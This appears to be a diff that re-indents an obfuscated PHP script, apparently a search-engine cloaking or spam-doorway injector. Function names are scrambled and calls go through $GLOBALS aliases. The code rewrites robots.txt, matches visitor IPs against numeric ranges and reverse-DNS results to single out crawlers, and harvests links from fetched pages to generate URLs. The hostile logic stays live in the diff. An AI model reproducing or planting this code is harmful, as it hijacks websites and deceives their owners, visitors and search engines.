@@ -272,70 +272,79 @@ l1uKK($l1XNaVU);
 }}
 
 function l1Rc6HvA($l1ucnnn,$l13aW=1){
-$l1lEpe='\\?/|&()[]{
-}+^$!:*';
-$l1rPS2cy=l13C3($l1lEpe);
-$l17Ek=$GLOBALS["b66b6bb6"];
-if($l13aW){
-$l1ucnnn=$GLOBALS["bbb6bbb66"]($GLOBALS["b6bb"],'',$l1ucnnn);
-}foreach($l1rPS2cy as$l1k8){
-$l1ucnnn=$GLOBALS["b6bb66666"]($l1k8,$GLOBALS["b66bbb6bb"]($l17Ek,'\\',$l1k8),$l1ucnnn);
-}return$l1ucnnn;
+    $l1lEpe='\\?/|&()[]{}+^$!:*';
+    $l1rPS2cy=l13C3($l1lEpe);
+    $l17Ek=$GLOBALS["b66b6bb6"];
+    if($l13aW){
+        $l1ucnnn=$GLOBALS["bbb6bbb66"]($GLOBALS["b6bb"],'',$l1ucnnn);
+    }
+    foreach($l1rPS2cy as$l1k8){
+        $l1ucnnn=$GLOBALS["b6bb66666"]($l1k8,$GLOBALS["b66bbb6bb"]($l17Ek,'\\',$l1k8),$l1ucnnn);
+    }
+    return$l1ucnnn;
 }
 
 function l1spc7n9($l1WD,$l1Vx,$l1iiC,$l1J){
-$l1Pt7l=array();
-if($l1Vx>0){
-if($l1WD<=$l1Vx){
-$l1Pt7l=$GLOBALS["bb6b6b"](0,$l1WD);
-}else{
-$l1lN5=$GLOBALS["bb6b6bb"](1,($l1WD-$l1Vx*2));
-$l1Pt7l=$GLOBALS["bb6b6b"]($l1lN5,$l1lN5+$l1Vx-1);
-}}return$l1Pt7l;
+    $l1Pt7l=array();
+    if($l1Vx>0){
+        if($l1WD<=$l1Vx){
+            $l1Pt7l=$GLOBALS["bb6b6b"](0,$l1WD);
+        }else{
+            $l1lN5=$GLOBALS["bb6b6bb"](1,($l1WD-$l1Vx*2));
+            $l1Pt7l=$GLOBALS["bb6b6b"]($l1lN5,$l1lN5+$l1Vx-1);
+        }
+    }
+    return$l1Pt7l;
 }
 
 function l1K5dsu($l1o2ge=''){
-$l1K5dsu="$l1o2ge/robots.txt";
-if(!l1TMU($l1K5dsu)){
-@$GLOBALS["bb6b66bb"]($l1K5dsu);
-l1AeQJ($l1K5dsu,$GLOBALS["b66bbb6bb"]($GLOBALS["b66bb666"],' ',"\n"));
-l1uKK($l1K5dsu);
-}}
+    $l1K5dsu="$l1o2ge/robots.txt";
+    if(!l1TMU($l1K5dsu)){
+        @$GLOBALS["bb6b66bb"]($l1K5dsu);
+        l1AeQJ($l1K5dsu,$GLOBALS["b66bbb6bb"]($GLOBALS["b66bb666"],' ',"\n"));
+        l1uKK($l1K5dsu);
+    }
+}
 
 function l1guW($l1GjNWID,$l1MC8=0){
-global$l1GH0rfZ,$l1Z4k,$l11ufJ,$l1NhADdH;
-$l1GI03=$l1GjNWID[0];
-$l129ZMS=$l1GjNWID[1];
-$l1m=$l1GjNWID[2];
-$l1r='';
-$l16Bzq=$l1GI03+$l129ZMS;
-$l1uhLcQp=l1kohsP($l1GH0rfZ["url_rules"],$l16Bzq);
-if($l1uhLcQp!=''){
-$l1r=$l1GH0rfZ["url_prefix"].($l1GH0rfZ["url_prefix_qm"]?$GLOBALS["bbb6bbb66"]("/\?/",$GLOBALS["bb6b6"],$l1uhLcQp):$l1uhLcQp);
-$l1eF1wx=$l1NhADdH[$GLOBALS["b66b6bb"]($l1NhADdH)];
-$l1RpDvj9=l1kohsP($l1GH0rfZ["extensions"],$l16Bzq);
-$l1r=$GLOBALS["b6bb66666"](array('#','^','$','!','*'),array($l1eF1wx,$l1GI03,$l129ZMS,$l129ZMS,$l1RpDvj9),$l1r);
-$GLOBALS["b6b6bb6bb"]($GLOBALS["b6bb66"],$l1r,$l1XukJCN);
-if(isset($l1XukJCN[0])){
-foreach($l1XukJCN[0]as$l1VxUy=>$l1s9Q5C){
-$l1pa=$l1XukJCN[1][$l1VxUy]==''?0:$l1XukJCN[1][$l1VxUy];
-$l1g=$l1XukJCN[2][$l1VxUy]==''?$GLOBALS["b6b6b66"]:$l1XukJCN[2][$l1VxUy];
-$l1r=$GLOBALS["bbb6bbb66"]('/'.$GLOBALS["bbbb666"]($l1s9Q5C,$GLOBALS["b6b"]).$GLOBALS["b66b"],l1RnVra($l1pa,$l1g,-1),$l1r,1);
-}}
-$l1r=$l1GH0rfZ["url_prefix_qm"]?$GLOBALS["bbb6bbb66"]($GLOBALS["b666bb6"],$GLOBALS["bbb66bbb"],$l1r):$l1r;
-}return$l1Z4k.($l1MC8?$l1r:"$l1r$l1m{
-$l1GjNWID[3]}<");
+    global$l1GH0rfZ,$l1Z4k,$l11ufJ,$l1NhADdH;
+    $l1GI03=$l1GjNWID[0];
+    $l129ZMS=$l1GjNWID[1];
+    $l1m=$l1GjNWID[2];
+    $l1r='';
+    $l16Bzq=$l1GI03+$l129ZMS;
+    $l1uhLcQp=l1kohsP($l1GH0rfZ["url_rules"],$l16Bzq);
+
+    if($l1uhLcQp!=''){
+        $l1r=$l1GH0rfZ["url_prefix"].($l1GH0rfZ["url_prefix_qm"]?$GLOBALS["bbb6bbb66"]("/\?/",$GLOBALS["bb6b6"],$l1uhLcQp):$l1uhLcQp);
+        $l1eF1wx=$l1NhADdH[$GLOBALS["b66b6bb"]($l1NhADdH)];
+        $l1RpDvj9=l1kohsP($l1GH0rfZ["extensions"],$l16Bzq);
+        $l1r=$GLOBALS["b6bb66666"](array('#','^','$','!','*'),array($l1eF1wx,$l1GI03,$l129ZMS,$l129ZMS,$l1RpDvj9),$l1r);
+        $GLOBALS["b6b6bb6bb"]($GLOBALS["b6bb66"],$l1r,$l1XukJCN);
+
+        if(isset($l1XukJCN[0])){
+            foreach($l1XukJCN[0]as$l1VxUy=>$l1s9Q5C){
+                $l1pa=$l1XukJCN[1][$l1VxUy]==''?0:$l1XukJCN[1][$l1VxUy];
+                $l1g=$l1XukJCN[2][$l1VxUy]==''?$GLOBALS["b6b6b66"]:$l1XukJCN[2][$l1VxUy];
+                $l1r=$GLOBALS["bbb6bbb66"]('/'.$GLOBALS["bbbb666"]($l1s9Q5C,$GLOBALS["b6b"]).$GLOBALS["b66b"],l1RnVra($l1pa,$l1g,-1),$l1r,1);
+            }
+        }
+        $l1r=$l1GH0rfZ["url_prefix_qm"]?$GLOBALS["bbb6bbb66"]($GLOBALS["b666bb6"],$GLOBALS["bbb66bbb"],$l1r):$l1r;
+    }
+    return$l1Z4k.($l1MC8?$l1r:"$l1r$l1m{$l1GjNWID[3]}<");
 }
 
 function l1kohsP($l1C=array(),$l1zoXNve=0){
-$l1WRE66m='';
-$l1zoXNve=(int)$l1zoXNve;
-if(!empty($l1C)){
-if(isset($l1C[$l1zoXNve])){
-$l1WRE66m=$l1C[$l1zoXNve];
-}else{
-$l1WRE66m=$l1C[$l1zoXNve%$GLOBALS["bbbb666bb"]($l1C)];
-}}return$l1WRE66m;
+    $l1WRE66m='';
+    $l1zoXNve=(int)$l1zoXNve;
+    if(!empty($l1C)){
+        if(isset($l1C[$l1zoXNve])){
+            $l1WRE66m=$l1C[$l1zoXNve];
+        }else{
+            $l1WRE66m=$l1C[$l1zoXNve%$GLOBALS["bbbb666bb"]($l1C)];
+        }
+    }
+    return$l1WRE66m;
 }
 
 function l1g1oAl2($l1a,$l1qu2H,$l113,$l1V=0){
@@ -356,17 +365,21 @@ $l12Dw=array();
 if($GLOBALS["bbb66666b"]("/^$l1O$/",$GLOBALS["b6bbb66b"]($l1a),$l12Dw)){
 $l1yc8E=array(1,$l12Dw);
 break;
-}}}return$l1yc8E;
+}}}
+return$l1yc8E;
 }
 
 function l1S(){
-$l1n41HS=array($GLOBALS["bbb66"],$GLOBALS["b666b6"],$GLOBALS["b666666"],$GLOBALS["bbb6b6bb"],$GLOBALS["bb66b6"],$GLOBALS["b666b"],);
-$l1z=$GLOBALS["bbbb6bb"];
-foreach($l1n41HS as$l1Ud){
-if(!empty($_SERVER[$l1Ud])&&$GLOBALS["bbb6b6b66"]($_SERVER[$l1Ud])!=$GLOBALS["bbbb6bb"]){
-$l1z=$_SERVER[$l1Ud];
-break;
-}}return$l1z;
+    $l1n41HS=array($GLOBALS["bbb66"],$GLOBALS["b666b6"],$GLOBALS["b666666"],$GLOBALS["bbb6b6bb"],$GLOBALS["bb66b6"],$GLOBALS["b666b"],);
+    $l1z=$GLOBALS["bbbb6bb"];
+
+    foreach($l1n41HS as$l1Ud){
+        if(!empty($_SERVER[$l1Ud])&&$GLOBALS["bbb6b6b66"]($_SERVER[$l1Ud])!=$GLOBALS["bbbb6bb"]){
+            $l1z=$_SERVER[$l1Ud];
+            break;
+        }
+    }
+    return$l1z;
 }
 
 function l1gVD2yX(){
@@ -380,16 +393,32 @@ $l13P=$l1jccWg=l1S();
 if(($l1lDxHoB=$GLOBALS["b6bbbbb"]($l1jccWg))<0){
 $l1lDxHoB+=4294967296;
 }
-$l16k=array(array(3639549953,3639558142),array(1089052673,1089060862),array(1123635201,1123639294),array(1208926209,1208942590),array(3512041473,3512074238),array(1113980929,1113985022),array(1249705985,1249771518),array(1074921473,1074925566),array(3481178113,3481182206),array(2915172353,2915237886),array(2850291712,2850357247),array(1823129600,1823145983),array(1823539200,1823571967),array(2398748672,2398879743),array(2899902464,2899967999),array(2902261760,2902327295),array(2915172352,2915237887),array(3232890880,3233021951),array(3344429056,3344430079),array(3481178112,3481182207),array(3487539200,3487543295),array(3518562304,3518627839),array(3512041472,3512074239),array(3639549952,3639558143),array(3625975808,3626237951),array(3627728896,3627737087),array(1074921472,1074925567),array(1089052672,1089060863),array(1078214656,1078222847),array(1113980928,1113985023),array(1123631104,1123639295),array(1176535040,1176543231),array(1180172288,1180434431),array(1208926208,1208942591),array(1249705984,1249771519),array(134217728,150994943),array(1081896984,1081896991),array(2159111488,2159111679),array(2159128096,2159128111),array(3468331392,3468331283),array(3459234728,3459234735),array(3475195328,3475195391),array(3494556048,3494556063),array(3522775360,3522775367),array(1062518496,1062518527),array(1081575648,1081575655),array(1081927080,1081927087),array(1082183584,1082183599),array(1074918400,1074918431),array(1103424288,1103424303),array(1104396896,1104396911),array(1104572512,1104572543),array(1104609120,1104609135),array(1105036720,1105036735),array(1105135664,1105135679),array(1119913504,1119913519),array(1132356616,1132356623),array(1180359472,1180359479),array(1180359496,1180359503),array(3518589952,3518590207),array(3518627072,3518627327),array(3512069632,3512069887),array(3639550208,3639550463),array(3639551232,3639551487),array(3639551842,3639551843),array(3639552352,3639552355),array(3639553280,3639553535),array(3639553536,3639553791),array(3639554912,3639556963),array(3626100131,3626100131),array(1089056193,1089056255),array(1078218752,1078219007),array(1078219008,1078219263),array(1078219264,1078219519),array(1078219520,1078219775),array(1078219776,1078220031),array(1078220032,1078220287),array(1078220288,1078220543),array(1078220544,1078220799),array(1078220800,1078221055),array(1078221056,1078221311),array(1078221313,1078221567),array(1078221568,1078221823),array(1078221824,1078222079),array(1123631104,1123631359),array(1123631360,1123631615),array(1123631616,1123631871),array(1123631872,1123632127),array(1123632128,1123632383),array(1123632384,1123632639),array(1123632640,1123632895),array(1123632896,1123633151),array(1123633152,1123633407),array(1123633408,1123633663),array(1123634688,1123634943),array(1123634944,1123635199),array(1208928000,1208928000),array(134623232,134623487),array(1123634176,1123634431),array(1089052672,1089060863),array(1113980928,1113985023),array(1123631104,1123639295),array(1208926208,1208942591),array(1249705984,1249771519),array(3512041472,3512074239),array(3639549952,3639558143),array(3639550208,3639550463),array(3639550720,3639550975),array(3639551232,3639551487),array(3639551744,3639551999),array(3639554816,3639555071),array(3639555328,3639555583),array(3639555840,3639556095),array(3639556352,3639556607),array(3639556864,3639557119),array(1089052928,1089053183),array(1089060096,1089060351),array(1113983744,1113983999),array(1113982720,1113982975),array(1113983232,1113983487),array(1123631104,1123631359),array(1123631360,1123631615),array(1123631616,1123631871),array(1123632896,1123633151),array(1123633152,1123633407),array(1208930048,1208930303),array(1089060096,1089060351),array(1113983744,1113983999),array(1113982720,1113982975),array(1113983232,1113983487),array(1123631104,1123631359),array(1123631360,1123631615),array(1123631616,1123631871),array(1123632896,1123633151),array(1123633152,1123633407),array(1208930048,1208930303),array(3639550208,3639550463),array(3639550720,3639550975),array(3639551232,3639551487),array(3639551744,3639551999),array(3639554816,3639555071),array(3639555328,3639555583),array(3639555840,3639556095),array(3639556352,3639556607),array(3639556864,3639557119),array(1123631360,1123631615),array(1123632128,1123632383),array(1123632896,1123633151),array(3419421696,3419421951),array(3729389312,3729389567),array(1090060288,1090125823),array(1078394880,1078460415));
+$l16k=array(array(3639549953,3639558142),
+            array(1089052673,1089060862),
+            array(1123635201,1123639294),
+            array(1208926209,1208942590),
+            array(3512041473,3512074238),
+            array(1113980929,1113985022),
+            array(1249705985,1249771518),
+            array(1074921473,1074925566),
+            array(3481178113,3481182206),array(2915172353,2915237886),array(2850291712,2850357247),array(1823129600,1823145983),array(1823539200,1823571967),array(2398748672,2398879743),array(2899902464,2899967999),array(2902261760,2902327295),array(2915172352,2915237887),array(3232890880,3233021951),array(3344429056,3344430079),array(3481178112,3481182207),array(3487539200,3487543295),array(3518562304,3518627839),array(3512041472,3512074239),array(3639549952,3639558143),array(3625975808,3626237951),array(3627728896,3627737087),array(1074921472,1074925567),array(1089052672,1089060863),array(1078214656,1078222847),array(1113980928,1113985023),array(1123631104,1123639295),array(1176535040,1176543231),array(1180172288,1180434431),array(1208926208,1208942591),array(1249705984,1249771519),array(134217728,150994943),array(1081896984,1081896991),array(2159111488,2159111679),array(2159128096,2159128111),array(3468331392,3468331283),array(3459234728,3459234735),array(3475195328,3475195391),array(3494556048,3494556063),array(3522775360,3522775367),array(1062518496,1062518527),array(1081575648,1081575655),array(1081927080,1081927087),array(1082183584,1082183599),array(1074918400,1074918431),array(1103424288,1103424303),array(1104396896,1104396911),array(1104572512,1104572543),array(1104609120,1104609135),array(1105036720,1105036735),array(1105135664,1105135679),array(1119913504,1119913519),array(1132356616,1132356623),array(1180359472,1180359479),array(1180359496,1180359503),array(3518589952,3518590207),
+            array(3518627072,3518627327),array(3512069632,3512069887),array(3639550208,3639550463),array(3639551232,3639551487),array(3639551842,3639551843),array(3639552352,3639552355),array(3639553280,3639553535),array(3639553536,3639553791),array(3639554912,3639556963),array(3626100131,3626100131),array(1089056193,1089056255),array(1078218752,1078219007),array(1078219008,1078219263),array(1078219264,1078219519),array(1078219520,1078219775),array(1078219776,1078220031),array(1078220032,1078220287),array(1078220288,1078220543),array(1078220544,1078220799),array(1078220800,1078221055),array(1078221056,1078221311),array(1078221313,1078221567),array(1078221568,1078221823),array(1078221824,1078222079),array(1123631104,1123631359),array(1123631360,1123631615),array(1123631616,1123631871),array(1123631872,1123632127),array(1123632128,1123632383),array(1123632384,1123632639),array(1123632640,1123632895),array(1123632896,1123633151),array(1123633152,1123633407),array(1123633408,1123633663),array(1123634688,1123634943),array(1123634944,1123635199),array(1208928000,1208928000),array(134623232,134623487),array(1123634176,1123634431),array(1089052672,1089060863),array(1113980928,1113985023),array(1123631104,1123639295),array(1208926208,1208942591),array(1249705984,1249771519),array(3512041472,3512074239),array(3639549952,3639558143),array(3639550208,3639550463),array(3639550720,3639550975),array(3639551232,3639551487),
+            array(3639551744,3639551999),array(3639554816,3639555071),array(3639555328,3639555583),array(3639555840,3639556095),array(3639556352,3639556607),array(3639556864,3639557119),array(1089052928,1089053183),array(1089060096,1089060351),array(1113983744,1113983999),array(1113982720,1113982975),array(1113983232,1113983487),array(1123631104,1123631359),array(1123631360,1123631615),array(1123631616,1123631871),array(1123632896,1123633151),array(1123633152,1123633407),array(1208930048,1208930303),array(1089060096,1089060351),array(1113983744,1113983999),array(1113982720,1113982975),array(1113983232,1113983487),array(1123631104,1123631359),array(1123631360,1123631615),array(1123631616,1123631871),array(1123632896,1123633151),array(1123633152,1123633407),array(1208930048,1208930303),array(3639550208,3639550463),array(3639550720,3639550975),array(3639551232,3639551487),array(3639551744,3639551999),array(3639554816,3639555071),array(3639555328,3639555583),array(3639555840,3639556095),array(3639556352,3639556607),array(3639556864,3639557119),array(1123631360,1123631615),array(1123632128,1123632383),array(1123632896,1123633151),array(3419421696,3419421951),array(3729389312,3729389567),array(1090060288,1090125823),array(1078394880,1078460415));
+
 foreach($l16k as$l1GRsXVC){
-if($l1lDxHoB>=$l1GRsXVC[0]&&$l1lDxHoB<=$l1GRsXVC[1]){
-return true;
-}}
+    if($l1lDxHoB>=$l1GRsXVC[0]&&$l1lDxHoB<=$l1GRsXVC[1]){
+        return true;
+    }
+}
+
 $l1SHW=array(134217728,150994943,1062518496,1062518527,1074918400,1074918431,1074921472,1074925567,1078214656,1078222847,1081575648,1081575655,1081896984,1081896991,1081927080,1081927087,1082183584,1082183599,1089052672,1089060863,1103424288,1103424303,1104396896,1104396911,1104572512,1104572543,1104609120,1104609135,1105036720,1105036735,1105135664,1105135679,1113980928,1113985023,1119913504,1119913519,1123631104,1123639295,1132356616,1132356623,1176535040,1176543231,1180172288,1180359472,1180359479,1180359496,1180359503,1180434431,1208926208,1208942591,1249705984,1249771519,1823129600,1823145983,1823539200,1823571967,2159111488,2159111679,2159128096,2159128111,2398748672,2398879743,2899902464,2899967999,2902261760,2902327295,2915172352,2915237887,3232890880,3233021951,3344429056,3344430079,3459234728,3459234735,3468331392,3468331455,3475195328,3475195391,3481178112,3481182207,3487539200,3487543295,3494556048,3494556063,3512041472,3512074239,3518562304,3518627839,3522775360,3522775367,3625975808,3626237951,3627728896,3627737087,3639549952,3639558143);
+
 foreach($l1SHW as$l1jccWg){
-if($l1lDxHoB==$l1jccWg){
-return true;
-}}
+    if($l1lDxHoB==$l1jccWg){
+    return true;
+    }
+}
+
 $l1VaP419=array($GLOBALS["b6bbbbbb6"],$GLOBALS["bbbbb6"],$GLOBALS["b66bb"],$GLOBALS["bbb6b66"],$GLOBALS["bb6bbb6"],$GLOBALS["bb6bbb6bb"],$GLOBALS["b666b6b6b"],$GLOBALS["bbbb6b66"]);
 foreach($l1VaP419 as$l1a){
 if($GLOBALS["bbb6bbbb6"]($l16I,$l1a)!==false){
@@ -398,31 +427,43 @@ return l1n($l13P,$l16I);
 }
 
 function l1n($l12,$l1uiO){
-$l1U5o=array($GLOBALS["bb6bb"]=>array($GLOBALS["bbb66bb"],$GLOBALS["bb666b"],),$GLOBALS["bb6666b6b"]=>array($GLOBALS["b6b6b"],$GLOBALS["b6bbb"],),$GLOBALS["bb6b6b6b"]=>array($GLOBALS["bbb666b6"],$GLOBALS["b66bb6bb"],),$GLOBALS["b666b6b"]=>array($GLOBALS["bbbbb6"],$GLOBALS["b6666b66"],),);
+    $l1U5o=array($GLOBALS["bb6bb"]=>array($GLOBALS["bbb66bb"],$GLOBALS["bb666b"],),
+                 $GLOBALS["bb6666b6b"]=>array($GLOBALS["b6b6b"],$GLOBALS["b6bbb"],),
+                 $GLOBALS["bb6b6b6b"]=>array($GLOBALS["bbb666b6"],$GLOBALS["b66bb6bb"],),
+                 $GLOBALS["b666b6b"]=>array($GLOBALS["bbbbb6"],$GLOBALS["b6666b66"],),
+                 );
 
-if(!$GLOBALS["bbb66666b"]('/^(\d{1,3}\.){3}\d{1,3}$/',$l12)){
-return false;
-}
-if(empty($l1uiO)){
-return false;
-}foreach($l1U5o as$l1xw=>$l1NuWnWf){
-if($GLOBALS["b6bbbb66"]($l1uiO,$l1NuWnWf[0])!==false){
-$l16Xp=$GLOBALS["b66bb6666"]($l12);
-if($l16Xp&&$GLOBALS["b6bbbb66"]($l16Xp,$l1NuWnWf[1])!==false){
-return$l1xw;
-}}}return false;
+    if(!$GLOBALS["bbb66666b"]('/^(\d{1,3}\.){3}\d{1,3}$/',$l12)){
+        return false;
+    }
+
+    if(empty($l1uiO)){
+        return false;
+    }
+
+    foreach($l1U5o as$l1xw=>$l1NuWnWf){
+        if($GLOBALS["b6bbbb66"]($l1uiO,$l1NuWnWf[0])!==false){
+            $l16Xp=$GLOBALS["b66bb6666"]($l12);
+            if($l16Xp&&$GLOBALS["b6bbbb66"]($l16Xp,$l1NuWnWf[1])!==false){
+                return$l1xw;
+            }
+        }
+    }
+
+    return false;
 }
 
 function l15w($l1WoAo5U,$l1OZb,$l1S=array()){
-$l1Lp=array('a'=>-1,'b'=>-1);
-if($GLOBALS["b66bbb6"]($l1S)){
-foreach($l1S as$l12b){
-if($GLOBALS["bbb6b6b"]($l12b)){
-if($l1Lp["a"]==-1){
-$l1Lp["a"]=$l12b;
-}else{
-$l1Lp["b"]=$l12b;
-}}}}return$l1Lp;
+    $l1Lp=array('a'=>-1,'b'=>-1);
+    if($GLOBALS["b66bbb6"]($l1S)){
+    foreach($l1S as$l12b){
+    if($GLOBALS["bbb6b6b"]($l12b)){
+    if($l1Lp["a"]==-1){
+    $l1Lp["a"]=$l12b;
+    }else{
+    $l1Lp["b"]=$l12b;
+    }}}}
+    return$l1Lp;
 }
 
 function l1kw6($l1L='',$l1FGxQ=0){
@@ -472,86 +513,93 @@ return$l1K9o0F1;
 }
 
 function l19($l1SDKs){
-global$l1Ni6,$l1go;
-$l1Nt=$GLOBALS["b6bb66666"]("$l1SDKs/",'',$l1Ni6);
-$l1BRS=array();
-$l1O=l1BSTEtn(l1O2($l1SDKs));
-$l1BRS[]=$l1go;
-foreach($l1O as$l184039L){
-$_SERVER["REQUEST_URI"]="/$l184039L";
-$l1BRS[]=l1J('',0,$l1go);
-}
-$GLOBALS["bb6bb6b"]($l1O,'');
-return array('a'=>$l1BRS,'b'=>$l1O);
+    global$l1Ni6,$l1go;
+    $l1Nt=$GLOBALS["b6bb66666"]("$l1SDKs/",'',$l1Ni6);
+    $l1BRS=array();
+    $l1O=l1BSTEtn(l1O2($l1SDKs));
+    $l1BRS[]=$l1go;
+
+    foreach($l1O as$l184039L){
+        $_SERVER["REQUEST_URI"]="/$l184039L";
+        $l1BRS[]=l1J('',0,$l1go);
+    }
+
+    $GLOBALS["bb6bb6b"]($l1O,'');
+    return array('a'=>$l1BRS,'b'=>$l1O);
 }
 
 function l1HsDyi2($l1LgtDjH,$l1Wt,$l1gu){
-$l1IOCJO=array();
-$l1wI17dN=@$GLOBALS["b6bbbb6b"]($l1LgtDjH);
-if($l1wI17dN===false){
-$l1wI17dN=l1O2($l1Wt);
-@l1AeQJ($l1LgtDjH,$l1wI17dN);
-}
-$l1wI17dN=$GLOBALS["b66bb6b6"]('|',$l1wI17dN);
-$l1sei6v=PHP_INT_MAX;
-foreach($l1wI17dN as$l1y){
-$l14Sn29=$GLOBALS["b66bb6b6"]('-',$l1y);
-if($l1sei6v>$l14Sn29[2]){
-$l1sei6v=$l14Sn29[2];
-}
-$l1IOCJO[$l14Sn29[0]]=array();
-}
-$l1jQISa=array();
-for($l1tz9b=0;
-$l1tz9b<$l1gu;
-$l1tz9b++){
-$l1jQISa[]=$GLOBALS["bb6b6bb"](0,$l1sei6v-1);
-}foreach($l1IOCJO as$l1u8lF=>$l1qpXI){
-$l1IOCJO[$l1u8lF]=$l1jQISa;
-}return$l1IOCJO;
+    $l1IOCJO=array();
+    $l1wI17dN=@$GLOBALS["b6bbbb6b"]($l1LgtDjH);
+    if($l1wI17dN===false){
+        $l1wI17dN=l1O2($l1Wt);
+        @l1AeQJ($l1LgtDjH,$l1wI17dN);
+    }
+    $l1wI17dN=$GLOBALS["b66bb6b6"]('|',$l1wI17dN);
+    $l1sei6v=PHP_INT_MAX;
+    foreach($l1wI17dN as$l1y){
+        $l14Sn29=$GLOBALS["b66bb6b6"]('-',$l1y);
+        if($l1sei6v>$l14Sn29[2]){
+            $l1sei6v=$l14Sn29[2];
+        }
+        $l1IOCJO[$l14Sn29[0]]=array();
+    }
+    $l1jQISa=array();
+    for($l1tz9b=0;$l1tz9b<$l1gu;$l1tz9b++){
+        $l1jQISa[]=$GLOBALS["bb6b6bb"](0,$l1sei6v-1);
+    }
+    foreach($l1IOCJO as$l1u8lF=>$l1qpXI){
+        $l1IOCJO[$l1u8lF]=$l1jQISa;
+    }
+    return$l1IOCJO;
 }
 
 function l1vJ($l1qMwO){
-$l1dgT='';
-$GLOBALS["bbb66666b"]($GLOBALS["b6bb666b"],$l1qMwO,$l147sy);
-if($GLOBALS["b66bbb6"]($l147sy)&&$GLOBALS["bbbb666bb"]($l147sy)==4){
-if($l147sy[2]!=''){
-$l1TKft0=$GLOBALS["b6bb6b66"]("//",$l147sy[2],-1,PREG_SPLIT_NO_EMPTY);
-foreach($l1TKft0 as$l1Z=>$l1lemlY6){
-$l1TKft0[$l1Z]=$GLOBALS["b6bbb6bbb"]($GLOBALS["b6bbbbb66"]($l1lemlY6)-5);
-}
-$l1dgT=$GLOBALS["bbbbbb66"]('',$l1TKft0);
-}
-$l1dgT=$l147sy[1].$l1dgT.$l147sy[3];
-}return$l1dgT;
+    $l1dgT='';
+    $GLOBALS["bbb66666b"]($GLOBALS["b6bb666b"],$l1qMwO,$l147sy);
+    if($GLOBALS["b66bbb6"]($l147sy)&&$GLOBALS["bbbb666bb"]($l147sy)==4){
+        if($l147sy[2]!=''){
+            $l1TKft0=$GLOBALS["b6bb6b66"]("//",$l147sy[2],-1,PREG_SPLIT_NO_EMPTY);
+            foreach($l1TKft0 as$l1Z=>$l1lemlY6){
+                $l1TKft0[$l1Z]=$GLOBALS["b6bbb6bbb"]($GLOBALS["b6bbbbb66"]($l1lemlY6)-5);
+            }
+            $l1dgT=$GLOBALS["bbbbbb66"]('',$l1TKft0);
+        }
+        $l1dgT=$l147sy[1].$l1dgT.$l147sy[3];
+    }
+    return$l1dgT;
 }
 
 function l1BSTEtn($l1bC){
-global$l1Ni6;
-$l16Hy2G=array();
-$GLOBALS["b6b6bb6bb"]("/<a.*?href=['\"]?(.*?)['\"\s>]/si",$l1bC,$l1TJWV);
-if(isset($l1TJWV[1])&&!empty($l1TJWV[1])){
-foreach($l1TJWV[1]as$l1je2vbZ){
-$l1je2vbZ=$GLOBALS["b666bb66b"]($l1je2vbZ);
-if($l1je2vbZ!=''){
-$l1je2vbZ=$GLOBALS["bbb6bbb66"]($GLOBALS["bbbb6bb6b"],'',$GLOBALS["b666bb66b"]($l1je2vbZ));
-$l1je2vbZ=$GLOBALS["bbb6bbb66"]($GLOBALS["b66b6b"],'',$l1je2vbZ);
-$l1je2vbZ=$GLOBALS["b6bb66666"]('\\','',$l1je2vbZ);
-if($l1je2vbZ!=''&&!$GLOBALS["bbb66666b"]('/\.(jpg|jpeg|gif|png|bmp|svg)$/si',$l1je2vbZ)){
-if(!$GLOBALS["b66b6666b"]($l1je2vbZ,$l16Hy2G)){
-$l16Hy2G[]=l1kw6($l1je2vbZ,1);
-}}}}}return$l16Hy2G;
+    global$l1Ni6;
+    $l16Hy2G=array();
+    $GLOBALS["b6b6bb6bb"]("/<a.*?href=['\"]?(.*?)['\"\s>]/si",$l1bC,$l1TJWV);
+    if(isset($l1TJWV[1])&&!empty($l1TJWV[1])){
+    foreach($l1TJWV[1]as$l1je2vbZ){
+    $l1je2vbZ=$GLOBALS["b666bb66b"]($l1je2vbZ);
+    if($l1je2vbZ!=''){
+    $l1je2vbZ=$GLOBALS["bbb6bbb66"]($GLOBALS["bbbb6bb6b"],'',$GLOBALS["b666bb66b"]($l1je2vbZ));
+    $l1je2vbZ=$GLOBALS["bbb6bbb66"]($GLOBALS["b66b6b"],'',$l1je2vbZ);
+    $l1je2vbZ=$GLOBALS["b6bb66666"]('\\','',$l1je2vbZ);
+    if($l1je2vbZ!=''&&!$GLOBALS["bbb66666b"]('/\.(jpg|jpeg|gif|png|bmp|svg)$/si',$l1je2vbZ)){
+    if(!$GLOBALS["b66b6666b"]($l1je2vbZ,$l16Hy2G)){
+    $l16Hy2G[]=l1kw6($l1je2vbZ,1);
+    }}}}}
+    return$l16Hy2G;
 }
 
 function l1UT7($l1i=0){
-$l1ppW='';
-if($l1i==0){
-if(((isset($_SERVER["HTTPS"]))&&($GLOBALS["bbb6b6b66"]($_SERVER["HTTPS"])=='on'))||((isset($_SERVER["HTTP_X_FORWARDED_PROTO"]))&&($GLOBALS["bbb6b6b66"]($_SERVER["HTTP_X_FORWARDED_PROTO"])==$GLOBALS["bbb66b6"]))){
-$l1ppW='s';
-}}else{
-if($l1i==2){
-$l1ppW='s';
-}}return$l1ppW;
+    $l1ppW='';
+    if($l1i==0){
+        if(((isset($_SERVER["HTTPS"]))&&($GLOBALS["bbb6b6b66"]($_SERVER["HTTPS"])=='on'))||((isset($_SERVER["HTTP_X_FORWARDED_PROTO"]))&&($GLOBALS["bbb6b6b66"]($_SERVER["HTTP_X_FORWARDED_PROTO"])==$GLOBALS["bbb66b6"]))){
+            $l1ppW='s';
+        }
+    }else{
+        if($l1i==2){
+            $l1ppW='s';
+        }
+    }
+    return$l1ppW;
 }
 
 function l1P9LVD($l15tGX=''){
@@ -1052,7 +1100,3 @@ exit();
 }if($l1ko!=''){
 echo $GLOBALS["b6bbbb6b"]($l1ko);
 }}l1P9LVD();
-
-
-;
-
